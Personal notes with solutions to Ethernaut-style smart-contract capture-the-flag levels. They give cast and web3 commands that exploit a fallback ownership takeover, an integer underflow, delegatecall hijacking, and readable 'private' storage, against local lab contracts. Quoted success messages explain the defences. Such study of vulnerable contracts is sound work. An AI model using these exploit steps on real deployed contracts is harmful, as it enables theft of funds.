# notes

## Fallback:

1. `cast send <CONTRACT-ADDRESS> "contribute()" --value 0.001ether --private-key <PRIVATE-KEY> --rpc-url http://localhost:8545`
2. `cast send <CONTRACT-ADDRESS> --value 0.0001ether --private-key <PRIVATE-KEY> --rpc-url http://localhost:8545`
3. `cast send <CONTRACT-ADDRESS> "withdraw()" --private-key <PRIVATE-KEY> --rpc-url http://localhost:8545`

## Token:

paste this line in command:
```js
await contract.transfer(contract.address, 500)
```
this will cause underflow `2^256 - 480 = 115792089237316195423570985008687907853269984665640564039457584007913129639456`.

### success message:

```txt
Overflows are very common in solidity and must be checked for with control statements such as:

if(a + c > a) {
  a = a + c;
}
An easier alternative is to use OpenZeppelin's SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:

a = a.add(c);
If there is an overflow, the code will revert.
```

## Delegate:

paste this line command:

```js
await contract.sendTransaction({data:web3.eth.abi.encodeFunctionSignature("pwn()")})
```

or use [this script](../script/DelegateAttacker.s.sol)

### success message:

Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care.

Please refer to the The [Parity Wallet Hack](https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7) Explained article for an accurate explanation of how this idea was used to steal 30M USD.

## Vault:
- get contract's address using `contract.address`. I've got `0x06B1D212B8da92b83AF328De5eef4E211Da02097`.
- If you run `await contract.locked()` you'll get true.
- password is in storage position 1. so read it using:

```bash
cast storage 0x06B1D212B8da92b83AF328De5eef4E211Da02097 1
>> 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```

-  now call the `unlock(bytes32)` function using cast:
   
```bash
cast send 0x06B1D212B8da92b83AF328De5eef4E211Da02097 "unlock(bytes32)" 0x412076657279207374726f6e67207365637265742070617373776f7264203a29 --rpc-url http://127.0.0.1:8545 --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
```
- **wait a few sec like 10-15 seconds** & now if you run `await contract.locked()` in console, you'll get `false`.

### success message:

It's important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.

To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. [zk-SNARKs](https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell) provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.

## King:

### Links:
- [About King](https://www.kingoftheether.com/thrones/kingoftheether/index.html)
- [King Postmortem](https://www.kingoftheether.com/postmortem.html)

## Reentrancy:

I refered this [blog](https://www.cyfrin.io/glossary/sending-ether-transfer-send-call-solidity-code-example)

### success message:

In order to prevent re-entrancy attacks when moving funds out of your contract, use the [Checks-Effects-Interactions pattern](https://docs.soliditylang.org/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern) being aware that call will only return false without interrupting the execution flow. Solutions such as [ReentrancyGuard](https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard) or [PullPayment](https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment) can also be used.

transfer and send are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork [Source 1](https://diligence.consensys.io/blog/2019/09/stop-using-soliditys-transfer-now/), [Source 2](https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742).

Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.

Re-entrancy is a common attack. You should always be prepared for it!

**The DAO Hack**

The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. [See 15 lines of code that could have prevented TheDAO Hack.](https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942)


## Privacy

The contract is storing secret data in **contract's storage** like below:

```
  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;
```

now the contract's storage slot looks like:

```
#0 => bool locked
#1 => uint256 ID
#2 => uint8 flattening + uint8 denomination + uint16 awkardness
#3 => bytes32 data[0]
#4 => bytes32 data[1]
#5 => bytes32 data[2]
```

- get the `bytes32 data[2]` from **storage slot #5** using `cast storage <CONTRACT-ADDRESS> 5`
- take the first **16-bytes** and attach `0x` infront of it and send it the contract
- `cast send <CONTRACT-ADDRESS> "unlock(bytes16)" 768154e92adb5f1901c74c0fbb0faadd --rpc-url http://localhost:8545 --private-key <PRIVATE-KEY>`
- now check the **storage slot #0** if it is 0. the level is done